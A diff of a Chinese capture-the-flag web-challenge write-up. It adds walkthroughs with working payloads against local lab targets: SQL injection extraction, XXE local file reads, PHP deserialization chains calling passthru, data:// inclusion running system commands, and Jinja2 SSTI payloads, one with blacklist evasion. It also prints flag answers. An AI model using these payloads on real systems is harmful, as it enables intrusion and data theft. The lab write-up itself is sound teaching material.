@@ -15,6 +15,8 @@
 
 ![使用控制台运行 JSFuck 混淆后的代码](./run_jsfuck-ed_code_in_console.png)
 
+也可以使用 [de4js](https://lelinhtinh.github.io/de4js/) 等反混淆器得到答案。
+
 ## 01 第一章 神秘的手镯
 
 > [!NOTE]
@@ -40,7 +42,7 @@ function validatePassword() {
 
 ![在源代码中直接得到 `flag` 的内容](./get_flag_directly_in_source_code.png)
 
-这里即可得到 `flag` 内容。或许也可以尝试绕过或禁用禁止粘贴的 JavaScript 代码，但具体如何操作，星澜音并未进一步尝试。
+这里即可得到 `flag` 内容。我们也有另一种绕过粘贴检测的方式：直接用 `notepad` 打开对应文件后，全选并拖入输入框中。
 
 ## 02 第二章 初识金曦玄轨
 
@@ -56,7 +58,7 @@ function validatePassword() {
 ## 03 第三章 问剑石！篡天改命！<!---->
 
 > [!NOTE]
-> **FLAG:** `moectf{Get-P0sT_TR4NsmISSion_I5_a_GOOD_METhoDl1l17e}`
+> **FLAG:** `moectf{Get-P0sT_TR4NsmISSion_I5_a_GOOD_METhoD??????}`，后面可能是随机的。
 
 根据小说描述，我们需要在网页发出「测试天赋」请求时，抓取该 HTTP POST 包并修改其参数和数据体内容。我们使用 Burp Suite 的 Proxy，打开 Intercept 后，在 Burp Suite 内置的 Chromium 浏览器中访问给定的网址，并进行一次「测试天赋」。
 
@@ -96,10 +98,186 @@ Connection: keep-alive
 
 ![修改 HTTP POST 请求体](./edit_http_post_request_body.png)
 
+## 04 第四章 金曦破禁与七绝傀儡阵
+
+> [!NOTE]
+> **FLAG:** `moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}`
+
+<div align="center">
+
+**「以金曦玄轨之力破解七道禁制，获得玄机秘钥。」**<!--markdownlint-disable-line MD036-->
+
+</div>
+
+这里我们给出全程仅使用浏览器和 `curl` 的做法。使用 Burp Suite 和 Postman 等套件的做法是显然的。
+
+### 第一关：磐石傀儡
+
+> [!NOTE]
+> **玉简碎片 1:** `bW9lY3Rme0Mw`
+
+只需访问 `localhost:port/stone_golem?key=xdsec` 即可。
+
+### 第二关：织云傀儡
+
+> [!NOTE]
+> **玉简碎片 2:** `bjZyNDd1MTQ3`
+
+使用 `curl` 进行追加表单数据的 HTTP POST 请求即可。
+
+```bash
+curl -X POST "http://127.0.0.1:3604/cloud_weaver" -d "declaration=织云阁=第一"
+```
+
+得到输出如下（节选，排版有优化）：
+
+```html
+<div class="result success">
+    <p><i class="fas fa-check-circle"></i> 织云傀儡欢欣鼓舞，风刃消散！</p>
+    <div class="flag-piece">获得玉简碎片: bjZyNDd1MTQ3</div>
+</div>
+<div class="next-level">
+    <a href="/shadow_stalker">前往第三关：溯源傀儡</a>
+</div>
+```
+
+并据此获知第三关的地址 `localhost:port/shadow_stalker`。
+
+### 第三关：溯源傀儡
+
+> [!NOTE]
+> **玉简碎片 3:** `MTBuNV95MHVy`
+
+使用 `curl` 进行指定 Header 的 HTTP GET 请求即可，在 Header 中包含 `X-Forwarded-For` 参数。
+
+```bash
+curl -X GET "http://127.0.0.1:3604/shadow_stalker" -H "X-Forwarded-For: 127.0.0.1"
+```
+
+得到输出如下（节选，排版有优化）：
+
+```html
+<div class="result success">
+    <p><i class="fas fa-check-circle"></i> 溯源傀儡认可你的身份，缓缓退入阴影！</p>
+    <div class="flag-piece">获得玉简碎片: MTBuNV95MHVy</div>
+</div>
+<div class="next-level">
+    <a href="/soul_discerner">前往第四关：器灵傀儡</a>
+</div>
+```
+
+并据此获知第四关的地址 `localhost:port/soul_discerner`。
+
+### 第四关：器灵傀儡
+
+> [!NOTE]
+> **玉简碎片 4:** `X2g3N1BfbDN2`
+
+类似地，我们有
+
+```bash
+curl -X GET "http://127.0.0.1:3604/soul_discerner" -H "User-Agent: moe browser"
+```
+
+得到输出如下（节选，排版有优化）：
+
+```html
+<div class="result success">
+    <p><i class="fas fa-check-circle"></i> 器灵傀儡光点欢快跳跃，发出悦耳的叮咚声！</p>
+    <div class="flag-piece">获得玉简碎片: X2g3N1BfbDN2</div>
+</div>
+<div class="next-level">
+    <a href="/heart_seal">前往第五关：心印傀儡</a>
+</div>
+```
+
+并据此获知第五关的地址 `localhost:port/heart_seal`。
+
+### 第五关：心印傀儡
+
+> [!NOTE]
+> **玉简碎片 5:** `M2xfMTVfcjM0`
+
+使用 `curl` 进行指定 Cookie 即可。
+
+```bash
+curl -X GET "http://127.0.0.1:3604/heart_seal" -b "user=xt"
+```
+
+得到输出如下（节选，排版有优化）：
+
+```html
+<div class="result success">
+    <p><i class="fas fa-check-circle"></i> 心印傀儡令牌瞬间定格，认你为xt长老！</p>
+    <div class="flag-piece">获得玉简碎片: M2xfMTVfcjM0</div>
+</div>
+<div class="next-level">
+    <a href="/pathfinder">前往第六关：前尘傀儡</a>
+</div>
+```
+
+并据此获知第六关的地址 `localhost:port/pathfinder`。
+
+### 第六关：前尘傀儡
+
+> [!NOTE]
+> **玉简碎片 6:** `bGx5X2gxOWgh`
+
+仿照上例显然。
+
+```bash
+curl -X GET "http://127.0.0.1:3604/pathfinder" -H "Referer: http://panshi/entry
+```
+
+得到输出如下（节选，排版有优化）：
+
+```html
+<div class="result success">
+    <p><i class="fas fa-check-circle"></i> 前尘傀儡光字停止流转，组合成一道光门！</p>
+    <div class="flag-piece">获得玉简碎片: bGx5X2gxOWgh</div>
+</div>
+<div class="next-level">
+    <a href="/void_rebirth">前往第七关：逆转傀儡</a>
+</div>
+```
+
+并据此获知第七关的地址 `localhost:port/void_rebirth`。
+
+### 第七关：逆转傀儡
+
+> [!NOTE]
+> **玉简碎片 7:** `fQ==`
+
+使用 `curl` 进行追加表单数据的 HTTP PUT 请求即可。
+
+```bash
+curl -X PUT "http://127.0.0.1:3604/void_rebirth" -d "新生！"
+```
+
+得到输出如下（节选，排版有优化）：
+
+```html
+<div class="result success">
+    <p><i class="fas fa-check-circle"></i> 逆转傀儡重获新生，炉口幽光收敛！</p>
+    <div class="flag-piece">获得玉简碎片: fQ==</div>
+</div>
+<div class="next-level">
+    <a href="/final_success">合成玄机秘钥</a>
+</div>
+```
+
+并据此获知最终关的地址 `localhost:port/final_success`。
+
+### 最终关
+
+> 收起七枚玉简，尤其是那枚空间波动最强的第七关玉简，HDdss 转身离开七绝傀儡阵。他知道，这枚玉简不仅是通关凭证，更可能指向下一个任务或机缘。手腕上，K 皇的虚影悄然浮现，带着一丝嘉许：「孺子可教。金曦破禁，已得三分真味。然此术浩瀚，日后更需勤修不辍。这『归墟玉简』……或许与老夫所需之『引魂玉』线索有关。且回听竹小筑，细细参研。」
+
+使用 Base64 解码 7 个玉简碎片拼接后的字符串即可。
+
 ## 05 第五章 打上门来！<!---->
 
 > [!NOTE]
-> **FLAG:** `moectf{Al1_1NPUT-lS-MAI1Ci0U52e744a19}`
+> **FLAG:** `moectf{Al1_1NPUT-lS-MAI1Ci0U5????????}`，后面可能是随机的。
 
 注意到打开的网页类似文件管理器，根据题目描述
 
@@ -109,10 +287,120 @@ Connection: keep-alive
 
 ![访问父目录以得到 `flag` 文件](./get_flag_in_parent_directory.png)
 
+## 06 第六章 藏经禁制？玄机初探！<!---->
+
+> [!NOTE]
+> **FLAG:** `moectf{WE1CoMe-to-SQ1_lnjecTiON!!???????}`，后面可能是随机的。
+
+这是一道基本的 SQL 注入题目。用户名输入 `lyrin`，密码输入 `' OR '1'='1` 即可。
+
+![进行基本的 SQL 注入](./basic_sql_injection.png)
+
+## 07 第七章 灵蛛探穴与阴阳双生符
+
+> [!NOTE]
+> **FLAG:** `moectf{Md5_lS_NOT-sAF3????????????}`，后面可能是随机的。
+
+爬虫使用的文件是 `robots.txt`，故打开 `localhost:port/robots.txt` 即可。得到如下内容：
+
+```plain
+User-agent: *
+Disallow: /flag.php
+```
+
+顺藤摸瓜找到 `flag.php`，内容如下：
+
+```php
+<?php
+highlight_file(__FILE__);
+$flag = getenv('FLAG');
+
+$a = $_GET["a"] ?? "";
+$b = $_GET["b"] ?? "";
+
+if($a == $b){
+    die("error 1");
+}
+
+if(md5($a) != md5($b)){
+    die("error 2");
+}
+
+echo $flag;
+```
+
+这段代码从环境变量中拿到 `FLAG`（这是一个伏笔：后续许多题目的 `flag` 都在环境变量中），从用户的请求中得到 `a` 和 `b`，但需要进行下面两次检测才会显示出 `flag`。这两次检测需要满足
+
+1. `a` 不能等于 `b`；
+2. `a` 和 `b` 的 MD5 值需要相同。
+
+PHP 存在这样的特性，若一个字符串以 `0e` 开头，则它会被解释为 `0`。基于此，我们只需找到 2 个字符串，使得它们的 MD5 值均以 `0e` 开头即可。
+
+我们给出两个可用的值：
+
+```plain
+240610708
+314282422
+```
+
+访问 `http://127.0.0.1:6218/flag.php?a=314282422&b=240610708` 即可得到 `flag`。
+
+## 08 第八章 天衍真言，星图显圣
+
+> [!NOTE]
+> 「和上次一样的界面，那我再登录一次就行了……吗？」
+>
+> **FLAG:** `moectf{uniOn_B4seD-5Ql1-FTWl12814a0e18}`，后面可能是随机的。
+
+注意到用户名随便输入，密码输入 `' OR '1'='1` 时，会返回且总会返回 `Welcome admin`🤔寻思着 `lyrin` 也不像 `admin` 啊，看来必须得深究一下了。
+
+首先我们确定这确实是一个 SQL 注入漏洞，而 `' OR '1'='1` 的成功也意味着我们确实可以控制 `WHERE` 子句。自然地，我们考虑 `flag` 可能位于这张表或另一张表中。无论如何，我们总应先确定原始 `SELECT` 查询返回了多少列。试试 `ORDER BY`——
+
+![使用 `'ORDER BY 1--` 探测列数失败](./failed_to_get_columns_by_orderby.png)
+
+？？最诡异的来了，我们发现 `'ORDER BY 1--` 都没一点用……可能是服务端屏蔽了 `ORDER BY` 语句？也有可能是服务端已经用了一次 `ORDER BY` 了？无论如何我们现在确实没法 `ORDER BY` 了，这个时候就必须要开始——手动 `UNION SELECT` 探测！
+
+> [!TIP]
+> 下面各指令，理论上，`--` 后需要一个空格。这是 SQL 语法的规定，只有 `--` 后接一个空格或其他控制字符，之后的内容才会被当作注释而忽略掉。
+
+<!--markdownlint-disable-next-line MD038-->
+我们使用任意用户名和密码 `' UNION SELECT NULL,NULL-- `，这里 `-- ` 表示注释后面的一切内容，即忽略掉 `UNION SELECT` 之后的内容，而连用 2 个 `NULL` 用来泛匹配列。假如列表有 `N` 列，当且仅当我们连用 `N` 个 `NULL`，页面会显示登录成功。刚好，我们探测到有 2 个列😋
+
+<!--markdownlint-disable-next-line MD038-->
+接下来我们探测一下，这 2 个列中，哪个列的数据会被显示在 `Welcome` 之后。使用 `' UNION SELECT 'position1','position2'-- ` 做到这一点，它会在 `Welcome` 后追加一个 `position` 值。尝试后得到
+
+![Welcome position1](./welcome_position1.png)
+
+那还能说啥，`Welcome` 之后跟的就是 `position1` 了😋接下来我们不加解释地直接使用 `GROUP_CONCAT` 函数：
+
+```plain
+' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=DATABASE()-- 
+```
+
+从 `DATABASE()` 中拿到 `tables` 值，以期获得所有的表名。
+
+![Welcome flag,users](./welcome_flag_users.png)
+
+这下看懂了，用户存于表 `users` 中，而 `flag` 表，顺理成章，则是用来存储 `flag` 的。接下来我们尝试获得 `flag` 表的所有列名：
+
+```plain
+' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='flag'-- 
+```
+
+![Welcome value](./welcome_value.png)
+
+拿到了！`flag` 表具有列名 `value`！最后一击——
+
+```plain
+' UNION SELECT GROUP_CONCAT(value),NULL FROM flag-- 
+```
+
+![从 `flag` 表的 `value` 列得到 `flag`](./get_flag_in_value_column_in_flag.png)
+
 ## 09 第九章 星墟禁制·天机问路
 
 > [!NOTE]
-> **FLAG:** `moectf{5a541491-288c-2dc5-48f7-f5b2b03ee805}`
+> 该题目的 `flag` 是随机的。
 
 在「星域真名」中输入 `stellalyrin.top`，得到：
 
@@ -132,7 +420,7 @@ Connection: keep-alive
 ## 10 第十章 天机符阵
 
 > [!NOTE]
-> **FLAG:** `moectf{G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l}`
+> **FLAG:** `moectf{G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l}`，后面可能是随机的。
 
 注意到：
 
@@ -142,7 +430,16 @@ Connection: keep-alive
 
 ![管理员的回应](./response_from_admin.png)
 
-经过出题人证实，这是一种非预期做法，并且在「10 第十章 天机符阵_revenge」中进行了修正。下面给出使用 XXE 注入的预期做法。
+经过出题人证实，这是一种非预期做法，并且在「10 第十章 天机符阵_revenge」中进行了修正。
+
+## 10 第十章 天机符阵_revenge
+
+> [!NOTE]
+> 该题目的 `flag` 是随机的。
+
+是对上一个第 10 题的「非预期」解法的修正。下面给出使用 XXE 注入的预期做法。
+
+![10_revenge 截图](./screenshot_of_10_revenge.png)
 
 在「契约内容」中输入 ` `（空格）后，观察「符阵推演结果」如下
 
@@ -154,13 +451,13 @@ Connection: keep-alive
 <输出>未定义</输出>
 ```
 
-观察到这是经典的 XXE（XML External Entity，XML 外部实体）注入攻击模板。「符阵推演结果」中的 `chapter10.php` 指示服务器正在使用 PHP 语言接受「契约内容」，而 `DOMDocument::loadXML()` 又表明服务器正在使用 XML 解析器来尝试解析用户的输入为 XML 文档。`'&lt;' not found in Entity` 指示服务器未找到「契约内容」中开头应当出现的 `<`，因为一个 XML 文档一般一定需要以一个标签开头，而这个标签以 `<` 开头。
+观察到这是经典的 XXE（XML External Entity，XML 外部实体）注入攻击的模板。「符阵推演结果」中的 `chapter10.php` 指示服务器正在使用 PHP 语言接受「契约内容」，而 `DOMDocument::loadXML()` 又表明服务器正在使用 XML 解析器来尝试解析用户的输入为 XML 文档。`'&lt;' not found in Entity` 指示服务器未找到「契约内容」中开头应当出现的 `<`，因为一个 XML 文档一般一定需要以一个标签开头，而这个标签以 `<` 开头。
 
 后续，「符阵推演结果」又输出了 `<阵枢>`、`<解析>` 和 `<输出>` 三部分，我们认为，这是服务器侧代码正常的处理逻辑：它会尝试解析「契约内容」为 XML，并将用户输入中对应的部分用来更换输出的「符阵推演结果」。我们应构造以下「契约内容」：
 
 ```xml
 <!DOCTYPE data [
-  <!ENTITY xxe SYSTEM "file:///var/www/html/flag.txt">
+  <!ENTITY xxe SYSTEM "file:///flag.txt">
 ]>
 
 <data>
@@ -168,7 +465,7 @@ Connection: keep-alive
 </data>
 ```
 
-`<!DOCTYPE data []>` 作为 DTD（Document Type Definition，文档类型定义）用以规定 XML 文档的结构和合法元素；`data` 指 XML 文档的根元素必须为 `data`，而 `[]` 内是具体的定义内容。我们在 `[]` 内定义了这样一个 entity（实体）：它的名字是 `xxe`，关键字 `SYSTEM` 告诉解析器实体的内容需要从外部资源中获取，`file:///var/www/html/flag.txt` 指定了该外部资源的具体位置，这是一个本地文件协议的 URI，地址就指向目标 `flag` 文件。通常情况下，我们并不能快速猜测 `flag` 文件的位置，这需要我们多次尝试。
+`<!DOCTYPE data []>` 作为 DTD（Document Type Definition，文档类型定义）用以规定 XML 文档的结构和合法元素；`data` 指 XML 文档的根元素必须为 `data`，而 `[]` 内是具体的定义内容。我们在 `[]` 内定义了这样一个 entity（实体）：它的名字是 `xxe`，关键字 `SYSTEM` 告诉解析器实体的内容需要从外部资源中获取，`file:///flag.txt` 指定了该外部资源的具体位置，这是一个本地文件协议的 URI，地址就指向目标 `flag` 文件。通常情况下，我们并不能快速猜测 `flag` 文件的位置，这需要我们多次尝试。~~终于不是在环境变量里了~~
 
 `<data></data>` 中定义了具体的 XML 文档的内容，`&xxe;` 引用了一个实体的内容。而之所以我们将 `&xxe;` 放在 `<输出></输出>` 中，是因为我们需要迎合服务器的处理逻辑，这一点在上文中提到过。
 
@@ -176,17 +473,10 @@ Connection: keep-alive
 
 ![使用 XXE 攻击获得 `flag`](./get_flag_via_xxe_attack.png)
 
-## 10 第十章 天机符阵_revenge
-
-> [!NOTE]
-> **FLAG:** `moectf{b4916167-5146-4cba-5a5e-3609f19dabc6}`
-
-是对上一个第 10 题的「非预期」解法的修正。做法和第 10 题完全一致，只是需要注意 `flag` 文件换了个位置。🤔
-
 ## 11 第十一章 千机变·破妄之眼
 
 > [!NOTE]
-> **FLAG:** `moectf{0bc61e1e-caca-3a28-0bb6-1ca4b24e5373}`
+> 该题目的 `flag` 是随机的。
 
 首先根据题目提示：
 
@@ -257,6 +547,8 @@ print("\n✅ 全部 120 个请求已发送！")
 
 经过尝试后，容易找到一个对应的 URL，它将我们重定向到 `/find.php` 页面。事实上，可能有更好的方法找到该 URL，但鉴于星澜音的 32G RAM 笔记本完全足以支撑 Edge 打开 120 个网页，所以暂且就先用这种土办法了。
 
+（事实上，使用 Burp Suite 的 Repeater 完成，比这种土方法快多了🤣）
+
 和先前一样，这又是一个类似于文件浏览器一样的界面。注意到有 `flag.php`，我们直接点击——
 
 ![「境界不够？」](./lack_of_depth.png)
@@ -297,7 +589,7 @@ echo "flag就在这了，看不到吗，是老弟境界不够吧";
 ## 12 第十二章 玉魄玄关·破妄
 
 > [!NOTE]
-> **FLAG:** `moectf{a83801f1-6ba9-ec7a-46be-08f8384e7f91}`
+> 该题目的 `flag` 是随机的。
 
 访问网页得到一段 PHP 代码：
 
@@ -316,7 +608,7 @@ highlight_file(__FILE__);
 ## 13 第十三章 通幽关·灵纹诡影
 
 > [!NOTE]
-> **FLAG:** `moectf{e6919f9b-dcce-fa32-41c4-5874a57d34ec}`
+> 该题目的 `flag` 是随机的。
 
 首先我们必须熟知，题目要求中的
 
@@ -340,7 +632,7 @@ system('printenv');
 ## 14 第十四章 御神关·补天玉碑
 
 > [!NOTE]
-> **FLAG:** `moectf{910d5543-7322-b826-1b96-cfa05233a924}`
+> 该题目的 `flag` 是随机的。
 
 本题有两种思路。
 
@@ -369,8 +661,9 @@ system('printenv');
 ## 16 第十六章 昆仑星途
 
 > [!NOTE]
-> 我们总说人一定要学会坚持，但方向也是不容忽略的、至关重要的因素……<br/>
-> **FLAG:** `moectf{32b41b90-b639-55ae-0b1a-0c87c9661bcc}`
+> 我们总说人一定要学会坚持，但方向也是不容忽略的、至关重要的因素……
+>
+> 该题目的 `flag` 是随机的。
 
 注意到 PHP 脚本：
 
@@ -462,14 +755,17 @@ include($_GET['file'] . ".php"); bin boot dev entrypoint.sh etc flag-VJhlPvt82dh
 http://127.0.0.1:9194/?file=data:text/plain,<?php system('cat /flag-VJhlPvt82dhb5oON7SnJNoILgcl9EG.txt'); ?>
 ```
 
-结束。哎……星澜音写到这里的时候，刚好是 8 月 28 日，军训开训没几天的日子。星澜音来到西电之后，可能是因为水土不服，胃肠功能紊乱，整个人直接寄完了，天天腹泻犯恶心；今天早上突然上吐下泻，没有办法，只好中午打包电脑和行李回家休养几天。下午被这个题坑了快三四个小时，才发现自己的方向一直是错的，幸好调整了方向，不然在 RFI 这个怪圈里就绕不出来了。星澜音的人生，方向又在哪里呢？或许还要等星澜音再探索探索吧。
+结束。
 
-虽说人生暂时没有方向，但好在星澜音还有一位「心之所向」。❤️好开心w 明天就是七夕节了，星澜音一定要和自己的心之所向永远在一起 (●'◡'●)
+> [!NOTE]
+> 哎……星澜音写到这里的时候，刚好是 8 月 28 日，军训开训没几天的日子。星澜音来到西电之后，可能是因为水土不服，胃肠功能紊乱，整个人直接寄完了，天天腹泻犯恶心；今天早上突然上吐下泻，没有办法，只好中午打包电脑和行李回家休养几天。下午被这个题坑了快三四个小时，才发现自己的方向一直是错的，幸好调整了方向，不然在 RFI 这个怪圈里就绕不出来了。星澜音的人生，方向又在哪里呢？或许还要等星澜音再探索探索吧。
+>
+> 虽说人生暂时没有方向，但好在星澜音还有一位[「心之所向」](https://github.com/DryIce-cc)。❤️好开心w 明天就是七夕节了，星澜音一定要和自己的心之所向永远在一起 (●'◡'●)
 
 ## 17 第十七章 星骸迷阵·神念重构
 
 > [!NOTE]
-> **FLAG:** `moectf{cada2f38-3a55-eddd-f38d-e8b0b0ef7be4}`
+> 该题目的 `flag` 是随机的。
 
 不太困难的 PHP 反序列题目。由题目给出的 PHP 脚本：
 
@@ -519,7 +815,7 @@ O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%2
 ## 18 第十八章 万卷诡阁·功法连环
 
 > [!NOTE]
-> **FLAG:** `moectf{981340d2-eed8-8181-8cc3-78e67c4d7bf7}`
+> 该题目的 `flag` 是随机的。
 
 继续观察脚本：
 
@@ -595,7 +891,7 @@ O%3A7%3A%22PersonA%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A7%3A%22PersonB%22%3A1%3A
 ## 19 第十九章 星穹真相·补天归源
 
 > [!NOTE]
-> **FLAG:** `moectf{5ae3db23-2b8c-523a-4e50-ff6f008ba1d9}`
+> 该题目的 `flag` 是随机的。
 
 继续观察脚本，我们……啊？这玩意咋这么长？！
 
@@ -721,6 +1017,9 @@ Fatal error: Uncaught Error: Attempt to assign property "age" on null in /app/in
 > 「昆仑墟终极试炼——万象镜域。」黑猫的声音从四面八方传来，它的身影在万千镜面中同时浮现，「这里的每一面镜子，都记录着你们生命中的真实与谎言。」
 >
 > 最大的镜面突然亮起，浮现出四重相生相克的功法烙印——
+<!---->
+> [!NOTE]
+> 该题目的 `flag` 是随机的。
 
 重新观察 PHP 文件：
 
@@ -793,10 +1092,850 @@ if(isset($_GET['person']))
 }
 ```
 
+继续注意到 `PersonC` 类中的 `check()` 方法，其 `$name($age)` 颇有 19 章中我们谈论到的 18 章题目的遗风，故这必然是我们的终点。我们可以把 `$name` 设置成 `"system"`……哎等等？！
+
+```php
+else if($name === "system")
+{
+    die("Hacker!");
+}
+```
+
+**龙颜大不悦.png**<!--markdownlint-disable-line MD036-->
+
+总之 `system` 是用不了了，那咋办😭别急，PHP 中能执行系统命令的函数一大堆，没了 `system()`，我们还有 `passthru()`、`shell_exec()`、`exec()` 之类的，这里我们就用 `passthru()` 了。那么起点呢？看来能主动被调用的只剩下 `PersonA` 类中的 `__destruct()` 方法了，那么思路就很清晰了——
+
+我们构造一个 `PersonC` 对象，其 `$name` 为 `"passthru"`。我们再构造一个 `PersonA` 对象，其 `$name` 为 `PersonC` 对象，其 `$id` 为 `"check"`，其 `$age` 则为 `check()` 的函数，这里就是 `printenv` 了😋别问为啥 `printenv`，问就是经验（
+
+构造 Payload 如下：
+
+```php
+<?php
+class Person
+{
+    public $name;
+    public $id;
+    public $age;
+}
+
+class PersonA extends Person {}
+class PersonB extends Person {}
+class PersonC extends Person {}
+
+$inner_object = new PersonC();
+$inner_object->name = "passthru";
+
+$outer_object = new PersonA();
+$outer_object->age = "printenv";
+$outer_object->id = "check";
+$outer_object->name = $inner_object;
+
+$payload = serialize($outer_object);
+
+echo urlencode($payload);
+?>
+```
+
+得到序列化后的 `payload`：
+
+```plain
+O%3A7%3A%22PersonA%22%3A3%3A%7Bs%3A4%3A%22name%22%3BO%3A7%3A%22PersonC%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A8%3A%22passthru%22%3Bs%3A2%3A%22id%22%3BN%3Bs%3A3%3A%22age%22%3BN%3B%7Ds%3A2%3A%22id%22%3Bs%3A5%3A%22check%22%3Bs%3A3%3A%22age%22%3Bs%3A8%3A%22printenv%22%3B%7D
+```
+
+访问后可以得到
+
+![19_revenge 的输出](./output_of_19_revenge.png)
+
+成功拿下😎
+
+## 20 第二十章 幽冥血海·幻语心魔
+
+> [!NOTE]
+> 该题目的 `flag` 是随机的。
+
+我们尝试在页面的两个输入框中输入一些文本，可以看到 `Welcome:` 后追加的是「神识名讳」的内容。这不自觉让我们想到 Jinja2 的 SSTI 漏洞。
+
+![尝试获得「阵法反馈」的输出规律」](./analyze_output_of_zhenfafankui.png)
+
+我们使用 `{{ 7*7 }}` 来测试是否具有 Jinja2 的 SSTI 可能性，结果是——确实存在！
+
+![检验 Jinja2 的 SSTI 可能性](./analyze_possibility_of_Jinja2_SSTI.png)
+
+那就好说了😋我们直接给出 Payload：
+
+```python
+{{ config.update(pwn=self.__init__.__globals__.__builtins__.__import__('os').popen('printenv').read()) }} {{ config.pwn }}
+```
+
+其中：`{{ ... }}` 是 Jinja2 模板的语法，用于执行表达式并输出结果。`config` 是 Flask 应用中的一个全局对象，通常用于存储配置变量；`update()` 方法用来更新字典，这里我们添加了一个名为 `pwn` 的配置项，它的值是后面表达式的执行结果。
+
+`self.__init__` 获取了当前对象的类的初始化方法，随后与 Misc 赛道的 Pyjail 题目思路类似，拿到了 `popen()` 和 `read()` 函数后，就类似于 `getshell` 了！最后，我们使用 `config.pwn` 输出 `pwn` 的值，也就是 `printenv` 命令的输出。
+
+运行一下看看：
+
+![从「阵法反馈」中得到 `flag`](./get_flag_in_zhenfafankui.png)
+
+好耶！
+
+## 21 第二十一章 往生漩涡·言灵死局
+
+> [!NOTE]
+> 该题目的 `flag` 是随机的。
+
+赏析一下美丽的 `app.py`……啊？
+
+```python
+from flask import Flask, request, render_template, render_template_string
+app = Flask(__name__)
+
+blacklist = ["__", "global", "{{", "}}"]
+
+@app.route('/')
+def index():
+    if 'username' in request.args or 'password' in request.args:
+        username = request.args.get('username', '')
+        password = request.args.get('password', '')
+
+        if not username or not password:
+            login_msg = """
+            <div class="login-result" id="result">
+                <div class="result-title">阵法反馈</div>
+                <div id="result-content"><div class='login-fail'>用户名或密码不能为空</div></div>
+            </div>
+            """
+        else:
+            login_msg = render_template_string(f"""
+            <div class="login-result" id="result">
+                <div class="result-title">阵法反馈</div>
+                <div id="result-content"><div class='login-success'>欢迎：{username}</div></div>
+            </div>
+            """)
+
+            for blk in blacklist:
+                if blk in username:
+                    login_msg = """
+                    <div class="login-result" id="result">
+                        <div class="result-title">阵法反馈</div>
+                        <div id="result-content"><div class='login-fail'>Error</div></div>
+                    </div>
+                    """
+    else:
+        login_msg = ""
+
+    return render_template("index.html", login_msg=login_msg)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)
+```
+
+这下坏了……虽说 Jinja2 的 SSTI 似乎还能有所突破，但是……这 `blacklist = ["__", "global", "{{", "}}"]` 未免有点太宽泛了吧😭
+
+我们一步步来分析这个问题。首先，`{{` 和 `}}` 都被屏蔽了；但是！Jinja2 仍然支持其他语法，例如 `{% %}` 可用于控制流，而 `{# #}` 可用于注释！如果尝试
+
+```python
+username={%print(request.application)%}&password=stellaice
+```
+
+可以看到
+
+```plain
+欢迎：<bound method Request.application of <class 'flask.wrappers.Request'>>
+```
+
+这说明我们的路没有被封死！这就好说了，如果 `{% %}` 内也能放我们想执行的命令，那其实差别不大。我们直接试一波 `import os`——
+
+```plain
+username={%import os%}{%print(os.popen('ls -la').read())%}&password=dryice_loves_lycecilion
+```
+
+![`import os` 会导致 Internal Server Error](./import_causes_internal_server_error.png)
+
+……啊？
+
+事实上经过星澜音后续测试，似乎只要涉及到 `import os`，就会导致 `Internal Server Error` 问题，气死我力😡😡看来我们只能另寻他路了。从 Pyjail 的经验中我们知道，如果直接 `import os` 不行的话，我们就只能使用古法 `__subclasses__` 了：
+
+```python
+{% set u = '_'~'_' %}{% set c = u~'class'~u %}{% set m = u~'mro'~u %}{% set s = u~'subclasses'~u %}{% set g = u~'getitem'~u %}{% print ''|attr(c)|attr(m)|attr(g)(1)|attr(s)()|length %}&password=why_this_is_inaccessible
+```
+
+该 Jinja2 语句将 `__` 拆成了两个 `_`，并拼接为变量 `u`，绕过了一个字符串检测。用拼出的 `u` 便可以拼出 `__class__`、`__mro__`、`__subclasses__` 和 `__getitem__` 来。在 Jinja2 中，`|` 是过滤器语法，`attr` 过滤器用来获取某个对象的属性，也就是说，`''|attr(c)` 就等价于 `''.__class__`；那么，上面这一段 Payload 就等价于：
+
+```python
+len(''.__class__.__mro__[1].__subclasses__())
+```
+
+即用于获取当前 Python 环境中所有内置的和已经加载的模块的类的数量。我们得到了
+
+```plain
+欢迎：501
+```
+
+说明该环境中有 501 个类！那足够多了——我们总能找到自己想要的！
+
+接下来该怎么办呢？在这里，星澜音就不卖关子了，直接给出最终 Payload：
+
+```python
+{% set u = '_'~'_' %}{% set i = u~'init'~u %}{% set g = u~'glo'~'bals'~u %}{% for cls in ''|attr(u~'class'~u)|attr(u~'mro'~u)|attr(u~'getitem'~u)(1)|attr(u~'subclasses'~u)() %}{% set ig = cls|attr(i)|attr(g) %}{% if ig and 'popen' in ig %}{% print(ig['popen']('printenv')|attr('read')()) %}{% endif %}{% endfor %}
+```
+
+除去绕过 `__` 的片段，我们直接向下分析：
+
+```python
+{% for cls in ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() %}
+```
+
+这是一个循环，它获取空字符串 `''` 的类 `str`，然后获取 `str` 的 MRO（方法解析顺序，通俗地说，「继承链」）的第 2 个元素（以索引 `1`），即 `object` 类，随后获得 `object.__subclasses__()`。随后，对于每一个子类 `cls`——
+
+```python
+{% set ig = cls|attr('__init__')|attr('__globals__') %}
+```
+
+我们获取 `cls.__init__.__globals__`，即全局变量字典。熟悉 Pyjail 的读者应当知道我们要干什么了——
+
+```python
+{% if ig and 'popen' in ig %}{% print(ig['popen']('printenv')|attr('read')()) %}
+```
+
+没错。这一段是显然的，我们就不解析了。
+
+## 22 第二十二章 血海核心·千年手段
+
+> [!NOTE]
+> 绝世神题，一天时间内逼疯零音和 Gemini 的题目，好在给出了一个虽然不太漂亮的解答。
+>
+> 该题目的 `flag` 是随机的。
+
+```python
+from flask import Flask, request, render_template, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    if 'username' in request.args or 'password' in request.args:
+        username = request.args.get('username', '')
+        password = request.args.get('password', '')
+
+        if not username or not password:
+            login_msg = """
+            <div class="login-result" id="result">
+                <div class="result-title">阵法反馈</div>
+                <div id="result-content"><div class='login-fail'>用户名或密码不能为空</div></div>
